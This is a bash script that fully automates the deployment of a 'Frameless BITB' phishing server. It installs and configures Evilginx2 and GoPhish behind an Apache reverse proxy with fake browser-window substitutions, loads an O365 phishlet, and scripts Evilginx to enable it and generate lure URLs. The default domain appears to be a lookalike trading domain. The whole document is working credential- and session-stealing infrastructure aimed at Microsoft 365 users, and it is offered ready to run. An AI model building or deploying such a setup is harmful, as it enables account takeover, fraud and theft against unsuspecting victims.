#!/bin/bash

#############################################
# Frameless BITB - Google Cloud Shell Setup
# Fully Automated Installation Script
#############################################

set -e  # Exit on any error

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DOMAIN="${DOMAIN:-exodustraderai.info}"
EMAIL="${EMAIL:-admin@${DOMAIN}}"
EVILGINX_PORT="8443"
GOPHISH_ADMIN_PORT="3333"
GOPHISH_PHISH_PORT="8080"
INSTALL_DIR="/opt/frameless-bitb"
EVILGINX_DIR="/opt/evilginx"
GOPHISH_DIR="/opt/gophish"

# Logging function
log() {
    echo -e "${GREEN}[$(date +'%Y-%m-%d %H:%M:%S')]${NC} $1"
}

error() {
    echo -e "${RED}[ERROR]${NC} $1"
    exit 1
}

warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

# Check if running as root
check_root() {
    if [ "$EUID" -ne 0 ]; then
        error "Please run as root (use sudo)"
    fi
}

# Update system packages
update_system() {
    log "Updating system packages..."
    apt update -qq
    apt upgrade -y -qq
    log "System packages updated successfully"
}

# Install required dependencies
install_dependencies() {
    log "Installing required dependencies..."

    DEBIAN_FRONTEND=noninteractive apt install -y -qq \
        git \
        wget \
        curl \
        make \
        gcc \
        apache2 \
        certbot \
        python3-certbot-apache \
        tmux \
        net-tools \
        ufw \
        sqlite3 \
        jq \
        unzip \
        &>/dev/null

    log "Dependencies installed successfully"
}

# Install Go
install_go() {
    log "Installing Go..."

    if command -v go &> /dev/null; then
        warning "Go is already installed ($(go version))"
        return
    fi

    GO_VERSION="1.21.6"
    wget -q "https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz"
    tar -C /usr/local -xzf "go${GO_VERSION}.linux-amd64.tar.gz"
    rm "go${GO_VERSION}.linux-amd64.tar.gz"

    # Add Go to PATH
    echo 'export PATH=$PATH:/usr/local/go/bin' >> /root/.profile
    echo 'export PATH=$PATH:/usr/local/go/bin' >> /etc/profile
    export PATH=$PATH:/usr/local/go/bin

    log "Go ${GO_VERSION} installed successfully"
}

# Clone and build Evilginx
install_evilginx() {
    log "Installing Evilginx..."

    # Clone Evilginx repository
    if [ ! -d "/tmp/evilginx2" ]; then
        git clone https://github.com/kgretzky/evilginx2 /tmp/evilginx2
    fi

    cd /tmp/evilginx2
    make

    # Create Evilginx directory structure
    mkdir -p "${EVILGINX_DIR}"
    mkdir -p "${EVILGINX_DIR}/phishlets"
    mkdir -p "${EVILGINX_DIR}/redirectors"

    # Copy binaries and files
    cp /tmp/evilginx2/build/evilginx "${EVILGINX_DIR}/"
    cp -r /tmp/evilginx2/redirectors/* "${EVILGINX_DIR}/redirectors/"
    cp -r /tmp/evilginx2/phishlets/* "${EVILGINX_DIR}/phishlets/"

    # Set permissions
    chmod +x "${EVILGINX_DIR}/evilginx"
    setcap CAP_NET_BIND_SERVICE=+eip "${EVILGINX_DIR}/evilginx"

    log "Evilginx installed successfully"
}

# Install GoPhish
install_gophish() {
    log "Installing GoPhish..."

    GOPHISH_VERSION="0.12.1"

    # Download GoPhish
    wget -q "https://github.com/gophish/gophish/releases/download/v${GOPHISH_VERSION}/gophish-v${GOPHISH_VERSION}-linux-64bit.zip" -O /tmp/gophish.zip

    # Extract GoPhish
    mkdir -p "${GOPHISH_DIR}"
    unzip -q /tmp/gophish.zip -d "${GOPHISH_DIR}"
    rm /tmp/gophish.zip

    # Set permissions
    chmod +x "${GOPHISH_DIR}/gophish"

    # Configure GoPhish to listen on custom ports
    cat > "${GOPHISH_DIR}/config.json" <<EOF
{
  "admin_server": {
    "listen_url": "0.0.0.0:${GOPHISH_ADMIN_PORT}",
    "use_tls": true,
    "cert_path": "gophish_admin.crt",
    "key_path": "gophish_admin.key"
  },
  "phish_server": {
    "listen_url": "0.0.0.0:${GOPHISH_PHISH_PORT}",
    "use_tls": false
  },
  "db_name": "sqlite3",
  "db_path": "gophish.db",
  "migrations_prefix": "db/db_"
}
EOF

    log "GoPhish installed successfully"
}

# Configure Evilginx
configure_evilginx() {
    log "Configuring Evilginx..."

    # Create Evilginx config directory
    mkdir -p /root/.evilginx

    # Create config.json
    cat > /root/.evilginx/config.json <<EOF
{
  "https_port": ${EVILGINX_PORT}
}
EOF

    log "Evilginx configured successfully"
}

# Configure Apache
configure_apache() {
    log "Configuring Apache..."

    # Stop Apache if running
    systemctl stop apache2 2>/dev/null || true

    # Enable required Apache modules
    a2enmod proxy proxy_http proxy_balancer lbmethod_byrequests env include setenvif ssl cache substitute headers rewrite &>/dev/null
    a2dismod access_compat &>/dev/null || true
    a2ensite default-ssl &>/dev/null

    # Fix DNS stub listener issue
    sed -i 's/#DNSStubListener=yes/DNSStubListener=no/' /etc/systemd/resolved.conf
    systemctl restart systemd-resolved

    log "Apache configured successfully"
}

# Setup SSL certificates
setup_ssl() {
    log "Setting up SSL certificates for ${DOMAIN}..."

    # Check if domain resolves to this server
    SERVER_IP=$(curl -s ifconfig.me)
    DOMAIN_IP=$(dig +short ${DOMAIN} | head -1)

    if [ "$SERVER_IP" != "$DOMAIN_IP" ]; then
        warning "Domain ${DOMAIN} does not resolve to this server IP (${SERVER_IP})"
        warning "Please update your DNS records before proceeding"
        info "Creating self-signed certificates for now..."

        # Create directory for certs
        mkdir -p "/etc/ssl/localcerts/${DOMAIN}"

        # Generate self-signed certificate
        openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
            -keyout "/etc/ssl/localcerts/${DOMAIN}/privkey.pem" \
            -out "/etc/ssl/localcerts/${DOMAIN}/fullchain.pem" \
            -subj "/C=US/ST=State/L=City/O=Organization/CN=${DOMAIN}" \
            -addext "subjectAltName=DNS:${DOMAIN},DNS:*.${DOMAIN}" &>/dev/null

        chmod 600 "/etc/ssl/localcerts/${DOMAIN}/privkey.pem"

        info "Self-signed certificates created at /etc/ssl/localcerts/${DOMAIN}/"
    else
        info "Domain resolves correctly. Obtaining Let's Encrypt certificate..."

        # Stop Apache temporarily
        systemctl stop apache2

        # Get Let's Encrypt certificate
        certbot certonly --standalone -d "${DOMAIN}" -d "*.${DOMAIN}" \
            --preferred-challenges dns \
            --email "${EMAIL}" \
            --agree-tos \
            --non-interactive || {
                warning "Let's Encrypt certificate request failed, using self-signed"

                mkdir -p "/etc/ssl/localcerts/${DOMAIN}"
                openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
                    -keyout "/etc/ssl/localcerts/${DOMAIN}/privkey.pem" \
                    -out "/etc/ssl/localcerts/${DOMAIN}/fullchain.pem" \
                    -subj "/C=US/ST=State/L=City/O=Organization/CN=${DOMAIN}" \
                    -addext "subjectAltName=DNS:${DOMAIN},DNS:*.${DOMAIN}" &>/dev/null

                chmod 600 "/etc/ssl/localcerts/${DOMAIN}/privkey.pem"
            }
    fi

    log "SSL certificates configured"
}

# Copy frameless-bitb files
setup_frameless_bitb() {
    log "Setting up Frameless BITB files..."

    # Create directories
    mkdir -p /var/www/home
    mkdir -p /var/www/primary
    mkdir -p /var/www/secondary
    mkdir -p /etc/apache2/custom-subs

    # Get script directory
    SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

    # Copy page files
    cp -r "${SCRIPT_DIR}/pages/home/"* /var/www/home/ 2>/dev/null || true
    cp -r "${SCRIPT_DIR}/pages/primary/"* /var/www/primary/ 2>/dev/null || true
    cp -r "${SCRIPT_DIR}/pages/secondary/"* /var/www/secondary/ 2>/dev/null || true

    # Copy custom substitution files
    cp -r "${SCRIPT_DIR}/custom-subs/"* /etc/apache2/custom-subs/ 2>/dev/null || true

    # Copy O365 phishlet
    cp "${SCRIPT_DIR}/O365.yaml" "${EVILGINX_DIR}/phishlets/" 2>/dev/null || true

    # Update domain in all files
    update_domain_in_files

    log "Frameless BITB files configured"
}

# Update domain in configuration files
update_domain_in_files() {
    log "Updating domain to ${DOMAIN} in all configuration files..."

    # Update Apache config
    if [ -f "/etc/apache2/sites-enabled/000-default.conf" ]; then
        sed -i "s/fake\.com/${DOMAIN}/g" /etc/apache2/sites-enabled/000-default.conf
    fi

    # Update custom-subs files
    find /etc/apache2/custom-subs/ -type f -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \; 2>/dev/null || true

    # Update page files
    find /var/www/ -type f -name "*.js" -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \; 2>/dev/null || true
    find /var/www/ -type f -name "*.html" -exec sed -i "s/fake\.com/${DOMAIN}/g" {} \; 2>/dev/null || true

    log "Domain updated in all files"
}

# Create Apache configuration
create_apache_config() {
    log "Creating Apache configuration..."

    # Determine SSL certificate path
    if [ -d "/etc/letsencrypt/live/${DOMAIN}" ]; then
        CERT_PATH="/etc/letsencrypt/live/${DOMAIN}"
        CERT_FILE="${CERT_PATH}/fullchain.pem"
        KEY_FILE="${CERT_PATH}/privkey.pem"
    else
        CERT_PATH="/etc/ssl/localcerts/${DOMAIN}"
        CERT_FILE="${CERT_PATH}/fullchain.pem"
        KEY_FILE="${CERT_PATH}/privkey.pem"
    fi

    # Create Apache config
    cat > /etc/apache2/sites-enabled/000-default.conf <<EOF
# Frameless BITB Apache Configuration
# Domain: ${DOMAIN}

Define certsPath ${CERT_PATH}
Define domain ${DOMAIN}

<VirtualHost *:443>
    ServerName subdomains.\${domain}
    ServerAlias *.\${domain}
    SSLEngine on
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off
    SSLCertificateFile ${CERT_FILE}
    SSLCertificateKeyFile ${KEY_FILE}
    ProxyPreserveHost On

    Alias /primary /var/www/primary
    <Directory /var/www/primary>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    ProxyPass /primary !

    Alias /secondary /var/www/secondary
    <Directory /var/www/secondary>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>
    ProxyPass /secondary !

    ProxyPass / https://127.0.0.1:${EVILGINX_PORT}/
    ProxyPassReverse / https://127.0.0.1:${EVILGINX_PORT}/

    # Enable output buffering and content substitution
    SetOutputFilter INFLATE;SUBSTITUTE;DEFLATE

    # Substitutions (excluding /primary, /secondary, and /)
    <LocationMatch "^/(?!secondary|primary|(\$|\?))">
        Include /etc/apache2/custom-subs/mac-chrome.conf
    </LocationMatch>

    # Substitutions only for base URL, only apply subs on /?auth=2
    <LocationMatch "^/\$">
        <If "%{QUERY_STRING} =~ /auth=2/">
            Include /etc/apache2/custom-subs/mac-chrome.conf
        </If>
    </LocationMatch>

    # Caching behavior
    <IfModule mod_headers.c>
        <FilesMatch ".+">
            Header set Cache-Control "max-age=3600, public"
        </FilesMatch>
    </IfModule>

    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access_evilginx.log "%h \\"%r\\" \\"%{Referer}i\\" \\"%{User-Agent}i\\""
</VirtualHost>

# Handle Base Domain separately
<VirtualHost *:443>
    ServerName \${domain}
    SSLEngine on
    SSLProxyEngine On
    SSLProxyVerify none
    SSLProxyCheckPeerCN off
    SSLProxyCheckPeerName off
    SSLProxyCheckPeerExpire off
    SSLCertificateFile ${CERT_FILE}
    SSLCertificateKeyFile ${KEY_FILE}
    ProxyPreserveHost On

    DocumentRoot /var/www/home

    <Directory /var/www/home>
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
    </Directory>

    ErrorLog \${APACHE_LOG_DIR}/error.log
    CustomLog \${APACHE_LOG_DIR}/access_evilginx.log "%h \\"%r\\" \\"%{Referer}i\\" \\"%{User-Agent}i\\""
</VirtualHost>

# Redirect HTTP to HTTPS
<VirtualHost *:80>
    ServerName \${domain}
    ServerAlias *.\${domain}
    Redirect permanent / https://\${domain}/
</VirtualHost>
EOF

    # Test Apache configuration
    apache2ctl configtest || error "Apache configuration test failed"

    log "Apache configuration created successfully"
}

# Configure firewall
configure_firewall() {
    log "Configuring firewall..."

    # Enable UFW
    ufw --force enable

    # Allow SSH
    ufw allow 22/tcp

    # Allow HTTP/HTTPS
    ufw allow 80/tcp
    ufw allow 443/tcp

    # Allow Evilginx port (internal only)
    ufw allow from 127.0.0.1 to any port ${EVILGINX_PORT}

    # Allow GoPhish admin port
    ufw allow ${GOPHISH_ADMIN_PORT}/tcp

    # Allow DNS
    ufw allow 53/tcp
    ufw allow 53/udp

    log "Firewall configured"
}

# Create systemd services
create_services() {
    log "Creating systemd services..."

    # Evilginx service
    cat > /etc/systemd/system/evilginx.service <<EOF
[Unit]
Description=Evilginx Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${EVILGINX_DIR}
ExecStart=${EVILGINX_DIR}/evilginx -p ${EVILGINX_DIR}/phishlets -developer
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

    # GoPhish service
    cat > /etc/systemd/system/gophish.service <<EOF
[Unit]
Description=GoPhish Phishing Framework
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=${GOPHISH_DIR}
ExecStart=${GOPHISH_DIR}/gophish
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

    # Reload systemd
    systemctl daemon-reload

    log "Systemd services created"
}

# Create management scripts
create_management_scripts() {
    log "Creating management scripts..."

    # Start script
    cat > /usr/local/bin/bitb-start <<'EOF'
#!/bin/bash
systemctl start apache2
systemctl start evilginx
systemctl start gophish
echo "All services started"
systemctl status apache2 evilginx gophish --no-pager
EOF
    chmod +x /usr/local/bin/bitb-start

    # Stop script
    cat > /usr/local/bin/bitb-stop <<'EOF'
#!/bin/bash
systemctl stop apache2
systemctl stop evilginx
systemctl stop gophish
echo "All services stopped"
EOF
    chmod +x /usr/local/bin/bitb-stop

    # Status script
    cat > /usr/local/bin/bitb-status <<'EOF'
#!/bin/bash
systemctl status apache2 evilginx gophish --no-pager
EOF
    chmod +x /usr/local/bin/bitb-status

    # Logs script
    cat > /usr/local/bin/bitb-logs <<'EOF'
#!/bin/bash
echo "=== Apache Logs ==="
tail -n 50 /var/log/apache2/error.log
echo ""
echo "=== Evilginx Logs ==="
journalctl -u evilginx -n 50 --no-pager
echo ""
echo "=== GoPhish Logs ==="
journalctl -u gophish -n 50 --no-pager
EOF
    chmod +x /usr/local/bin/bitb-logs

    log "Management scripts created"
}

# Create Evilginx initialization script
create_evilginx_init() {
    log "Creating Evilginx initialization script..."

    cat > "${EVILGINX_DIR}/init-evilginx.sh" <<EOF
#!/bin/bash

# Wait for Evilginx to start
sleep 5

# Connect to Evilginx and configure
tmux new-session -d -s evilginx-init
tmux send-keys -t evilginx-init "cd ${EVILGINX_DIR}" C-m
tmux send-keys -t evilginx-init "./evilginx -developer" C-m
sleep 3
tmux send-keys -t evilginx-init "config domain ${DOMAIN}" C-m
sleep 1
tmux send-keys -t evilginx-init "config ipv4 external" C-m
sleep 1
tmux send-keys -t evilginx-init "blacklist noadd" C-m
sleep 1
tmux send-keys -t evilginx-init "phishlets hostname O365 ${DOMAIN}" C-m
sleep 1
tmux send-keys -t evilginx-init "phishlets enable O365" C-m
sleep 1
tmux send-keys -t evilginx-init "lures create O365" C-m
sleep 1
tmux send-keys -t evilginx-init "lures get-url 0" C-m
EOF

    chmod +x "${EVILGINX_DIR}/init-evilginx.sh"

    log "Evilginx initialization script created"
}

# Start all services
start_services() {
    log "Starting all services..."

    # Enable services on boot
    systemctl enable apache2
    systemctl enable evilginx
    systemctl enable gophish

    # Start services
    systemctl start apache2
    sleep 2
    systemctl start evilginx
    sleep 2
    systemctl start gophish

    log "All services started"
}

# Display summary
display_summary() {
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║                  INSTALLATION COMPLETE!                        ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    info "Domain: ${DOMAIN}"
    info "Evilginx Port: ${EVILGINX_PORT}"
    info "GoPhish Admin: https://$(curl -s ifconfig.me):${GOPHISH_ADMIN_PORT}"
    echo ""
    echo -e "${YELLOW}Management Commands:${NC}"
    echo "  bitb-start  - Start all services"
    echo "  bitb-stop   - Stop all services"
    echo "  bitb-status - Check service status"
    echo "  bitb-logs   - View logs"
    echo ""
    echo -e "${YELLOW}Evilginx Configuration:${NC}"
    echo "  Location: ${EVILGINX_DIR}"
    echo "  Config: /root/.evilginx/config.json"
    echo "  Phishlets: ${EVILGINX_DIR}/phishlets/"
    echo ""
    echo -e "${YELLOW}GoPhish Configuration:${NC}"
    echo "  Location: ${GOPHISH_DIR}"
    echo "  Default credentials will be shown on first login"
    echo ""
    echo -e "${YELLOW}Apache Configuration:${NC}"
    echo "  Config: /etc/apache2/sites-enabled/000-default.conf"
    echo "  Logs: /var/log/apache2/"
    echo ""
    echo -e "${YELLOW}Next Steps:${NC}"
    echo "  1. Ensure DNS records for ${DOMAIN} point to this server"
    echo "  2. If using Let's Encrypt, run: certbot certonly --apache -d ${DOMAIN} -d *.${DOMAIN}"
    echo "  3. Access Evilginx: https://login.${DOMAIN}"
    echo "  4. Access GoPhish admin: https://$(curl -s ifconfig.me):${GOPHISH_ADMIN_PORT}"
    echo ""
    echo -e "${GREEN}Installation completed successfully!${NC}"
    echo ""
}

# Main installation function
main() {
    clear
    echo -e "${BLUE}"
    echo "╔═══════════════════════════════════════════════════════════════╗"
    echo "║     Frameless BITB - Automated Google Cloud Shell Setup      ║"
    echo "║                    Domain: ${DOMAIN}                          ║"
    echo "╚═══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo ""

    check_root
    update_system
    install_dependencies
    install_go
    install_evilginx
    install_gophish
    configure_evilginx
    configure_apache
    setup_ssl
    setup_frameless_bitb
    create_apache_config
    configure_firewall
    create_services
    create_management_scripts
    create_evilginx_init
    start_services
    display_summary
}

# Run main function
main "$@"
